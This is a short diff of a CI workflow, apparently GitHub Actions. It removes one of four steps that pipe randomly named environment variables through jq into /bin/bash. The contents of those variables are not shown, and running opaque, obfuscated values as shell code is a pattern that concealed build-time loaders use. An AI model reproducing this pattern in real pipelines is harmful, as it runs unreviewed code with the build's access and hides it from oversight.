@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$l87327" | jq -r .cem66911 | /bin/bash
           printf '%s' "$uy5047" | jq -r .wov667 | /bin/bash
-          printf '%s' "$ivke47578" | jq -r .k2601 | /bin/bash
           printf '%s' "$rjwuk62275" | jq -r .elq06085 | /bin/bash
 
       - name: Upload results
